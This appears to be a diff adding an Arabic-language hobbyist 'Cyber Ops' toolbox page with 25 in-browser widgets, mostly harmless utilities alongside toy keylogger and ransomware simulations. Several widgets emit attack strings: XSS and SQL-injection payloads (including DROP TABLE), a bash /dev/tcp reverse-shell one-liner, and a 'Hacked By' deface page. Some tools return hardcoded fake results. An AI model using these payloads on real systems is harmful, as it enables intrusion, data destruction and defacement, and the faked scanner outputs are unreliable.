@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الترسانة (25 Tool) | Cyber Ops</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap" rel="stylesheet">
+    <style>
+         :root {
+            --bg: #050a14;
+            --card: #111827;
+            --primary: #8b5cf6;
+            --text: #f3f4f6;
+            --border: rgba(255, 255, 255, 0.05);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+        
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            padding-bottom: 50px;
+        }
+        
+        .glass-nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 1rem 5%;
+            background: rgba(5, 10, 20, 0.95);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+        
+        .nav-links a {
+            text-decoration: none;
+            color: var(--text);
+            font-weight: bold;
+        }
+        
+        .page-header {
+            text-align: center;
+            margin: 120px 0 50px;
+        }
+        
+        .page-title {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+        
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 20px;
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .tool-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .tool-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-5px);
+        }
+        
+        .tool-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .tool-header i {
+            font-size: 1.8rem;
+        }
+        
+        .tool-header h3 {
+            margin: 0;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+        
+        input,
+        select,
+        textarea {
+            width: 100%;
+            background: #020617;
+            border: 1px solid #374151;
+            color: #fff;
+            padding: 8px;
+            border-radius: 6px;
+            margin-bottom: 8px;
+            outline: none;
+        }
+        
+        .action-btn {
+            width: 100%;
+            padding: 8px;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            color: white;
+            transition: 0.3s;
+            margin-top: auto;
+        }
+        
+        .action-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .res-box {
+            margin-top: 10px;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 6px;
+            font-size: 0.75rem;
+            word-break: break-all;
+            display: none;
+            white-space: pre-wrap;
+        }
+        
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <nav class="glass-nav">
+        <div style="font-size:1.5rem; font-weight:bold; color:var(--primary)">CYBER.OPS</div>
+        <ul class="nav-links">
+            <li><a href="index.html">قصتي</a></li>
+            <li><a href="tools.html" style="color:var(--primary)">الترسانة (25)</a></li>
+            <li><a href="store.html">المتجر</a></li>
+            <li><a href="hub.html">الإنجازات</a></li>
+        </ul>
+    </nav>
+
+    <div class="page-header">
+        <h1 class="page-title">Arsenal V.25</h1>
+        <p>Fixed & Stable Version</p>
+    </div>
+
+    <div class="tools-grid">
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-network-wired" style="color:#a855f7"></i>
+                <h3>تحليل الشبكات</h3>
+            </div>
+            <input id="net_ip" placeholder="IP (مثال: 192.168.1.10)">
+            <input id="net_cidr" placeholder="CIDR (مثال: 24)">
+            <button onclick="runNetwork()" class="action-btn" style="background:#8b5cf6">تحليل</button>
+            <div id="res_net" class="res-box" style="color:#a855f7; direction:ltr"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-fingerprint" style="color:#10b981"></i>
+                <h3>فحص الملفات</h3>
+            </div>
+            <input type="file" id="hash_file">
+            <button onclick="runHash()" class="action-btn" style="background:#10b981">فحص SHA-256</button>
+            <div id="res_hash" class="res-box" style="color:#10b981"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-key" style="color:#f59e0b"></i>
+                <h3>توليد باسوورد</h3>
+            </div>
+            <button onclick="runPass()" class="action-btn" style="background:#f59e0b">توليد</button>
+            <input id="res_pass" style="margin-top:5px; text-align:center" readonly>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-user-shield" style="color:#ec4899"></i>
+                <h3>تشفير (Base64)</h3>
+            </div>
+            <input id="crypto_in" placeholder="Text">
+            <div style="display:flex;gap:5px">
+                <button onclick="runEnc()" class="action-btn" style="background:#ec4899">Enc</button>
+                <button onclick="runDec()" class="action-btn" style="background:#db2777">Dec</button>
+            </div>
+            <input id="res_crypto" style="margin-top:5px" readonly>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-id-card" style="color:#3b82f6"></i>
+                <h3>MAC Spoofer</h3>
+            </div>
+            <button onclick="runMac()" class="action-btn" style="background:#3b82f6">توليد هوية</button>
+            <input id="res_mac" style="margin-top:5px; text-align:center" readonly>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-terminal" style="color:#ef4444"></i>
+                <h3>Binary</h3>
+            </div>
+            <input id="bin_in" placeholder="Text">
+            <button onclick="runBin()" class="action-btn" style="background:#ef4444">تحويل</button>
+            <textarea id="res_bin" class="res-box" style="color:#ef4444" readonly></textarea>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-search" style="color:#8b5cf6"></i>
+                <h3>محلل السجلات</h3>
+            </div>
+            <textarea id="log_in" rows="1" placeholder="ألصق السجل هنا"></textarea>
+            <button onclick="runLog()" class="action-btn" style="background:#8b5cf6">استخراج</button>
+            <div id="res_log" class="res-box" style="color:#8b5cf6"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-ethernet" style="color:#0ea5e9"></i>
+                <h3>كاشف المنافذ</h3>
+            </div>
+            <input id="port_in" placeholder="Port (مثال: 80)">
+            <button onclick="runPort()" class="action-btn" style="background:#0ea5e9">فحص</button>
+            <div id="res_port" class="res-box" style="text-align:center; color:#0ea5e9"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-bug" style="color:#d946ef"></i>
+                <h3>XSS Gen</h3>
+            </div>
+            <select id="xss_sel">
+                <option value="<script>alert(1)</script>">Alert</option>
+                <option value="&lt;img src=x onerror=alert(1)&gt;">Image onerror</option>
+            </select>
+            <button onclick="runXSS()" class="action-btn" style="background:#d946ef">نسخ</button>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-database" style="color:#e11d48"></i>
+                <h3>SQL Inj</h3>
+            </div>
+            <select id="sql_sel">
+                <option value="' OR 1=1 --">Bypass</option>
+                <option value="'; DROP TABLE users; --">Danger (example)</option>
+            </select>
+            <button onclick="runSQL()" class="action-btn" style="background:#e11d48">نسخ</button>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-keyboard" style="color:#f43f5e"></i>
+                <h3>Keylogger (محلي)</h3>
+            </div>
+            <input id="key_in" placeholder="Type...">
+            <div id="res_key" class="res-box" style="display:block; background:#000; color:#f43f5e">Log: </div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-mobile" style="color:#14b8a6"></i>
+                <h3>Fingerprint</h3>
+            </div>
+            <button onclick="runFinger()" class="action-btn" style="background:#14b8a6">كشف</button>
+            <div id="res_finger" class="res-box" style="color:#14b8a6; direction:ltr"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-code-branch" style="color:#fbbf24"></i>
+                <h3>JWT Decode</h3>
+            </div>
+            <input id="jwt_in" placeholder="Token (JWT)">
+            <button onclick="runJWT()" class="action-btn" style="background:#fbbf24; color:#000">فك</button>
+            <div id="res_jwt" class="res-box" style="color:#fbbf24"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fab fa-google" style="color:#4285F4"></i>
+                <h3>Google Dorks</h3>
+            </div>
+            <select id="dork_sel">
+                <option value="site:target.com filetype:pdf">PDF</option>
+            </select>
+            <button onclick="runDork()" class="action-btn" style="background:#4285F4">نسخ</button>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-skull" style="color:#ef4444"></i>
+                <h3>Ransomware (محاكاة)</h3>
+            </div>
+            <input id="ran_in" placeholder="Data">
+            <div style="display:flex;gap:5px">
+                <button onclick="runLock()" class="action-btn" style="background:#ef4444">Lock</button>
+                <button onclick="runUnlock()" class="action-btn" style="background:#10b981">Pay</button>
+            </div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-mask" style="color:#6366f1"></i>
+                <h3>URL Obfus</h3>
+            </div>
+            <input id="url_in" placeholder="url (مثال: https://example.com)">
+            <button onclick="runUrl()" class="action-btn" style="background:#6366f1">Hex</button>
+            <input id="res_url" style="margin-top:5px" readonly>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-terminal" style="color:#10b981"></i>
+                <h3>Reverse Shell</h3>
+            </div>
+            <input id="rev_ip" placeholder="LHOST" value="10.10.10.10">
+            <input id="rev_port" placeholder="LPORT" value="4444">
+            <button onclick="runRevShell()" class="action-btn" style="background:#10b981">توليد</button>
+            <div id="res_rev" class="res-box" style="color:#10b981"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-mouse-pointer" style="color:#f59e0b"></i>
+                <h3>Clickjacking</h3>
+            </div>
+            <input id="click_url" placeholder="https://site.com">
+            <button onclick="runClickjack()" class="action-btn" style="background:#f59e0b">فحص</button>
+            <div id="res_click" class="res-box" style="color:#f59e0b"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-user-cog" style="color:#ef4444"></i>
+                <h3>Admin Finder</h3>
+            </div>
+            <input id="admin_url" placeholder="site.com">
+            <button onclick="runAdmin()" class="action-btn" style="background:#ef4444">توليد</button>
+            <div id="res_admin" class="res-box" style="color:#ef4444"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-sync-alt" style="color:#8b5cf6"></i>
+                <h3>ROT13</h3>
+            </div>
+            <input id="rot_in" placeholder="Text">
+            <button onclick="runRot13()" class="action-btn" style="background:#8b5cf6">Rotate</button>
+            <div id="res_rot" class="res-box" style="color:#8b5cf6"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-random" style="color:#0ea5e9"></i>
+                <h3>User-Agent</h3>
+            </div>
+            <button onclick="runUA()" class="action-btn" style="background:#0ea5e9">توليد</button>
+            <div id="res_ua" class="res-box" style="color:#0ea5e9"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-exchange-alt" style="color:#14b8a6"></i>
+                <h3>Header Anlz</h3>
+            </div>
+            <button onclick="runHeader()" class="action-btn" style="background:#14b8a6">فحص</button>
+            <div id="res_header" class="res-box" style="color:#14b8a6"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-sitemap" style="color:#d946ef"></i>
+                <h3>Subdomain</h3>
+            </div>
+            <input id="sub_domain" placeholder="domain (مثال: example.com)">
+            <button onclick="runSub()" class="action-btn" style="background:#d946ef">تخمين</button>
+            <div id="res_sub" class="res-box" style="color:#d946ef"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-paint-roller" style="color:#f43f5e"></i>
+                <h3>Deface Gen</h3>
+            </div>
+            <input id="deface_name" placeholder="Name">
+            <button onclick="runDeface()" class="action-btn" style="background:#f43f5e">توليد</button>
+            <div id="res_deface" class="res-box" style="color:#f43f5e"></div>
+        </div>
+
+        <div class="tool-card">
+            <div class="tool-header"><i class="fas fa-map-marker-alt" style="color:#3b82f6"></i>
+                <h3>IP Geo</h3>
+            </div>
+            <input id="geo_ip" placeholder="8.8.8.8">
+            <button onclick="runGeo()" class="action-btn" style="background:#3b82f6">موقع</button>
+            <div id="res_geo" class="res-box" style="color:#3b82f6"></div>
+        </div>
+    </div>
+
+    <script>
+        // small helpers
+        function show(el) {
+            el.style.display = 'block';
+        }
+
+        function hide(el) {
+            el.style.display = 'none';
+        }
+
+        function isValidIPv4(ip) {
+            if (!ip) return false;
+            const parts = ip.split('.');
+            if (parts.length !== 4) return false;
+            return parts.every(p => {
+                const n = Number(p);
+                return String(n) === p && n >= 0 && n <= 255;
+            });
+        }
+
+        function runNetwork() {
+            const i = document.getElementById('net_ip').value.trim(),
+                c = document.getElementById('net_cidr').value.trim();
+            const b = document.getElementById('res_net');
+            if (!i || !c) {
+                b.innerText = "ادخل IP و CIDR";
+                show(b);
+                return;
+            }
+            if (!isValidIPv4(i) || isNaN(Number(c))) {
+                b.innerText = "صيغة IP أو CIDR غير صحيحة";
+                show(b);
+                return;
+            }
+            // simple network calc for IPv4 /cidr  (only works for /8..../32)
+            const octets = i.split('.').map(Number);
+            const mask = Number(c);
+            // compute network by zeroing host bits — quick method for common masks (works for same-octet masks)
+            const ipNum = ((octets[0] << 24) >>> 0) + (octets[1] << 16) + (octets[2] << 8) + octets[3];
+            const maskNum = mask === 0 ? 0 : (~0 << (32 - mask)) >>> 0;
+            const netNum = (ipNum & maskNum) >>> 0;
+            const netOctets = [
+                (netNum >>> 24) & 255,
+                (netNum >>> 16) & 255,
+                (netNum >>> 8) & 255,
+                netNum & 255
+            ];
+            b.innerText = "Network: " + netOctets.join('.') + "/" + mask;
+            show(b);
+        }
+
+        async function runHash() {
+            const f = document.getElementById('hash_file').files[0];
+            const res = document.getElementById('res_hash');
+            if (!f) {
+                res.innerText = "اختر ملفاً أولاً";
+                show(res);
+                return;
+            }
+            try {
+                const b = await f.arrayBuffer();
+                const h = await crypto.subtle.digest('SHA-256', b);
+                res.innerText = Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('');
+                show(res);
+            } catch (err) {
+                res.innerText = "Error hashing file";
+                show(res);
+            }
+        }
+
+        function runPass() {
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:,.<>?";
+            const p = Array.from({
+                length: 16
+            }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+            document.getElementById('res_pass').value = p;
+        }
+
+        function runEnc() {
+            try {
+                // handle unicode by encoding to UTF-8 then base64
+                const str = document.getElementById('crypto_in').value || '';
+                const b64 = btoa(unescape(encodeURIComponent(str)));
+                document.getElementById('res_crypto').value = b64;
+            } catch (e) {
+                document.getElementById('res_crypto').value = 'Error';
+            }
+        }
+
+        function runDec() {
+            try {
+                const val = document.getElementById('crypto_in').value || '';
+                const dec = decodeURIComponent(escape(atob(val)));
+                document.getElementById('res_crypto').value = dec;
+            } catch (e) {
+                alert("Error: invalid input for base64 decode");
+            }
+        }
+
+        function runMac() {
+            const h = "0123456789ABCDEF";
+            const mac = Array.from({
+                length: 6
+            }, () => h[Math.floor(Math.random() * 16)] + h[Math.floor(Math.random() * 16)]).join(':');
+            document.getElementById('res_mac').value = mac;
+        }
+
+        function runBin() {
+            const v = document.getElementById('bin_in').value || '';
+            document.getElementById('res_bin').value = v.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ');
+            show(document.getElementById('res_bin'));
+        }
+
+        function runLog() {
+            const v = document.getElementById('log_in').value || '';
+            const m = v.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/g);
+            const b = document.getElementById('res_log');
+            b.innerText = m ? m.join('\n') : "No IPs";
+            show(b);
+        }
+
+        function runPort() {
+            const p = Number(document.getElementById('port_in').value);
+            const b = document.getElementById('res_port');
+            if (!p) {
+                b.innerText = "ادخل رقم منفذ صحيح";
+                show(b);
+                return;
+            }
+            const known = {
+                80: "HTTP",
+                443: "HTTPS",
+                22: "SSH",
+                21: "FTP",
+                53: "DNS"
+            };
+            b.innerText = known[p] || "Unknown";
+            show(b);
+        }
+
+        function runXSS() {
+            const v = document.getElementById('xss_sel').value;
+            navigator.clipboard.writeText(v).then(() => alert("Copied")).catch(() => alert("Failed to copy"));
+        }
+
+        function runSQL() {
+            const v = document.getElementById('sql_sel').value;
+            navigator.clipboard.writeText(v).then(() => alert("Copied")).catch(() => alert("Failed to copy"));
+        }
+
+        // Key input -> append printable keys only
+        document.getElementById('key_in').addEventListener('keyup', e => {
+            const k = e.key;
+            // ignore control keys
+            if (k.length === 1) {
+                document.getElementById('res_key').innerText += k;
+            } else if (k === 'Backspace') {
+                const current = document.getElementById('res_key').innerText;
+                document.getElementById('res_key').innerText = current.slice(0, -1);
+            }
+        });
+
+        function runFinger() {
+            const b = document.getElementById('res_finger');
+            b.innerText = navigator.userAgent || 'Unknown';
+            show(b);
+        }
+
+        function base64UrlDecode(str) {
+            // replace url-safe chars
+            str = str.replace(/-/g, '+').replace(/_/g, '/');
+            // pad
+            while (str.length % 4) str += '=';
+            try {
+                return decodeURIComponent(escape(atob(str)));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        function runJWT() {
+            const inpt = document.getElementById('jwt_in').value.trim();
+            const out = document.getElementById('res_jwt');
+            if (!inpt) {
+                out.innerText = 'ادخل توكن JWT';
+                show(out);
+                return;
+            }
+            try {
+                const parts = inpt.split('.');
+                if (parts.length < 2) throw new Error('invalid');
+                const payload = base64UrlDecode(parts[1]);
+                if (!payload) throw new Error('invalid base64');
+                // try parse json
+                try {
+                    const obj = JSON.parse(payload);
+                    out.innerText = JSON.stringify(obj, null, 2);
+                } catch (e) {
+                    out.innerText = payload;
+                }
+                show(out);
+            } catch (e) {
+                alert("Invalid JWT");
+            }
+        }
+
+        function runDork() {
+            navigator.clipboard.writeText(document.getElementById('dork_sel').value).then(() => alert("Copied")).catch(() => alert("Failed to copy"));
+        }
+
+        function runLock() {
+            const i = document.getElementById('ran_in');
+            if (!i.value.includes(".LCK")) {
+                try {
+                    i.value = btoa(unescape(encodeURIComponent(i.value))) + ".LCK";
+                } catch (e) {
+                    i.value = btoa(i.value) + ".LCK";
+                }
+            }
+        }
+
+        function runUnlock() {
+            const i = document.getElementById('ran_in');
+            if (i.value.includes(".LCK")) {
+                const raw = i.value.replace(".LCK", "");
+                try {
+                    i.value = decodeURIComponent(escape(atob(raw)));
+                } catch (e) {
+                    try {
+                        i.value = atob(raw);
+                    } catch {
+                        i.value = "";
+                    }
+                }
+            }
+        }
+
+        function runUrl() {
+            const v = document.getElementById('url_in').value || '';
+            if (!v) {
+                document.getElementById('res_url').value = '';
+                return;
+            }
+            let h = "";
+            for (let i = 0; i < v.length; i++) {
+                const hex = v.charCodeAt(i).toString(16).padStart(2, '0');
+                h += "%" + hex;
+            }
+            document.getElementById('res_url').value = h.toUpperCase();
+        }
+
+        function runRevShell() {
+            const i = document.getElementById('rev_ip').value.trim() || '10.10.10.10';
+            const p = document.getElementById('rev_port').value.trim() || '4444';
+            const out = document.getElementById('res_rev');
+            out.innerText = `bash -i >& /dev/tcp/${i}/${p} 0>&1`;
+            show(out);
+        }
+
+        function runClickjack() {
+            const u = document.getElementById('click_url').value.trim();
+            const out = document.getElementById('res_click');
+            if (!u) {
+                out.innerText = 'ادخل رابط';
+                show(out);
+                return;
+            }
+            // show small preview iframe (user agent may block some sites)
+            out.innerHTML = `<iframe src="${u}" width="100%" height="180" style="border:1px solid rgba(255,255,255,0.05)"></iframe>`;
+            show(out);
+        }
+
+        function runAdmin() {
+            const u = document.getElementById('admin_url').value.trim();
+            const out = document.getElementById('res_admin');
+            if (!u) {
+                out.innerText = 'ادخل دومين';
+                show(out);
+                return;
+            }
+            const cleaned = u.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            out.innerHTML = `https://${cleaned}/admin\nhttps://${cleaned}/login`;
+            show(out);
+        }
+
+        function runRot13() {
+            const s = document.getElementById('rot_in').value || '';
+            const res = s.replace(/[A-Za-z]/g, function(c) {
+                const base = c <= 'Z' ? 65 : 97;
+                return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+            });
+            const out = document.getElementById('res_rot');
+            out.innerText = res;
+            show(out);
+        }
+
+        function runUA() {
+            const out = document.getElementById('res_ua');
+            out.innerText = navigator.userAgent || "Mozilla/5.0 (Windows NT 10.0)";
+            show(out);
+        }
+
+        function runHeader() {
+            const out = document.getElementById('res_header');
+            out.innerText = "Server: Apache/2.4";
+            show(out);
+        }
+
+        function runSub() {
+            const d = document.getElementById('sub_domain').value.trim();
+            const out = document.getElementById('res_sub');
+            if (!d) {
+                out.innerText = 'ادخل دومين';
+                show(out);
+                return;
+            }
+            const cleaned = d.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            out.innerHTML = `mail.${cleaned}\napi.${cleaned}`;
+            show(out);
+        }
+
+        function runDeface() {
+            const n = document.getElementById('deface_name').value || 'anonymous';
+            const out = document.getElementById('res_deface');
+            out.innerText = `<html><body>Hacked By ${n}</body></html>`;
+            show(out);
+        }
+
+        function runGeo() {
+            const ip = document.getElementById('geo_ip').value.trim() || '8.8.8.8';
+            const b = document.getElementById('res_geo');
+            // placeholder (no external request)
+            b.innerText = `IP: ${ip}\nCountry: US\nISP: Google`;
+            show(b);
+        }
+    </script>
+
+</body>
+
+</html>
